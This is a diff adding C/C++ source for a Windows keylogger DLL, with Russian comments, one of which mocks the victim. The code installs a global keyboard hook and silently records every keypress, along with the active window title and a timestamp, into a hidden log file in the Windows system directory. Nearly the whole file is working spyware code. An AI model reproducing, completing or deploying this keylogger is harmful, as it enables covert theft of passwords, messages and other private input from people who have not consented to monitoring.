@@ -1,0 +1,88 @@
+#include "ks.h"
+
+HANDLE hmod;
+HHOOK khook;
+HFILE LogFile;
+char LogFileName[256] = "ks.txt";//название лог-файла
+char FullLogFile[256] = "";
+char BufStr0[19] = "";
+char BufStr1[200] = "";
+char BufStr2[256] = "";
+char OldAct[1024] = "";
+LPSTR ActWin()//поца для определения активного окна
+{
+LPSTR ActW = new TCHAR[1024];
+SendMessage(GetForegroundWindow(),WM_GETTEXT,1024,(LONG)ActW);
+return ActW;
+};
+BOOL APIENTRY DllMain( HANDLE hModule,
+DWORD ul_reason_for_call,
+LPVOID lpReserved
+                    )
+{  //если лог файл по адресу c:\windir\sysdir отсутствует, то создаем его
+    GetSystemDirectory(FullLogFile,256);
+    strcat(FullLogFile,"\\");
+    strcat(FullLogFile,LogFileName);
+    LogFile = _lopen(FullLogFile,OF_WRITE);
+    if (LogFile == 4294967295)
+    {
+        LogFile = _lcreat(FullLogFile,4);
+    };
+    _lclose(LogFile);
+    hmod = hModule;
+return TRUE;
+}
+LRESULT CALLBACK HksKeyProc(int nCode,WPARAM wParam, LPARAM lParam)
+{
+    if (nCode == HC_ACTION && !(lParam & 0x80000000))
+    {
+       //если нажата клавиша, то
+        GetKeyNameText(lParam,BufStr0,19);
+        //если ламак не тыкал на кнопочки в этом приложении, то его мы пишем в лог-afqk
+        char *Active = ActWin();
+        if (strcmp(OldAct,Active) !=0)
+        {
+            strcpy(BufStr1,"\nActive Window(TITLE) ");
+            strcat(BufStr1,Active);
+            strcat(BufStr1,"\n");
+               //вместе с датой и временем
+            char DateStr0[256] = "dd.MM.yyyy";
+            char TimeStr1[256] = "hh : mm : ss";
+    char DateStr1[256] = "";
+    GetDateFormat(NULL,NULL,NULL,DateStr0,DateStr1,sizeof(DateStr1));
+strcat(BufStr1,"[");
+strcat(BufStr1,DateStr1);
+    strcat(BufStr1,"] ");
+            GetTimeFormat(NULL,TIME_FORCE24HOURFORMAT,NULL,TimeStr1,DateStr1,sizeof(DateStr1));
+            strcat(BufStr1," ");
+strcat(BufStr1,DateStr1);
+    strcat(BufStr1," \n");
+            strcat(BufStr1,"---------------------------------------------------\n");
+            strcpy(OldAct,Active);
+        };
+        //пишем название нажатой клавиши
+strcpy(BufStr2," ");
+        strcat(BufStr1,BufStr2);
+        strcat(BufStr1,BufStr0);
+        LogFile = _lopen(FullLogFile,OF_WRITE);
+        _llseek(LogFile,0,FILE_END);
+        _lwrite(LogFile,BufStr1,lstrlen(BufStr1));
+        _lclose(LogFile);
+        strcpy(BufStr1,"");
+    };
+    return CallNextHookEx(khook,nCode,wParam,lParam);
+};
+//процедура для установки хука
+void HksInit()
+{
+khook = SetWindowsHookEx(WH_KEYBOARD,
+        HksKeyProc,
+                            (HINSTANCE)hmod,
+                            NULL);
+
+};
+//процедура для закрытия хука
+void HksClose()
+{
+    UnhookWindowsHookEx(khook);
+};
